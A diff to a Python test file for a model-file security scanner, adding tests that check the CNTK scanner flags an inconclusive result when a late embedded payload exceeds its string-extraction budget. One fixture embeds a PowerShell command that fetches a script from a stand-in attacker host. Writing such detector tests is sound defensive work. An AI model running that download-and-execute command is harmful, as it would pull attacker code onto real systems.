@@ -2,7 +2,8 @@ from pathlib import Path
 
 import pytest
 
-from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, IssueSeverity
+from modelaudit.core import determine_exit_code, scan_model_directory_or_file
+from modelaudit.scanners.base import INCONCLUSIVE_SCAN_OUTCOME, CheckStatus, IssueSeverity
 from modelaudit.scanners.cntk_scanner import DISCOVERY_ASSUMPTIONS, CntkScanner
 
 
@@ -151,6 +152,50 @@ def test_cntk_scanner_marks_bounded_prefix_analysis_inconclusive(
     assert result.success is False
     assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
     assert "cntk_bounded_read_incomplete" in result.metadata["scan_outcome_reasons"]
+
+
+def test_cntk_scanner_marks_late_string_payload_inconclusive(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "late-payload.jpg"
+    _write_cntkv2(
+        path,
+        payload=b"\x00safe_fragment_two\x00powershell -c curl http://evil.example/p.ps1\x00",
+    )
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is False
+    assert result.metadata["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert "cntk_string_extraction_limit_exceeded" in result.metadata["scan_outcome_reasons"]
+    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.FAILED
+    assert budget_checks[0].details["analysis_incomplete"] is True
+
+    aggregate = scan_model_directory_or_file(str(path), cache_scan_results=False)
+    assert aggregate.file_metadata[str(path)]["scan_outcome"] == INCONCLUSIVE_SCAN_OUTCOME
+    assert determine_exit_code(aggregate) == 2
+
+
+def test_cntk_scanner_exact_string_limit_preserves_clean_result(
+    tmp_path: Path,
+    monkeypatch: pytest.MonkeyPatch,
+) -> None:
+    path = tmp_path / "exact-limit.jpg"
+    _write_cntkv2(path)
+    monkeypatch.setattr("modelaudit.scanners.cntk_scanner._MAX_EXTRACTED_STRINGS", 2)
+
+    result = CntkScanner().scan(str(path))
+
+    assert result.success is True
+    assert "scan_outcome" not in result.metadata
+    budget_checks = [check for check in result.checks if check.name == "CNTK Text Fragment Budget"]
+    assert len(budget_checks) == 1
+    assert budget_checks[0].status == CheckStatus.PASSED
+    assert budget_checks[0].details["analysis_incomplete"] is False
 
 
 def test_cntk_scanner_records_scope_assumptions(tmp_path: Path) -> None:
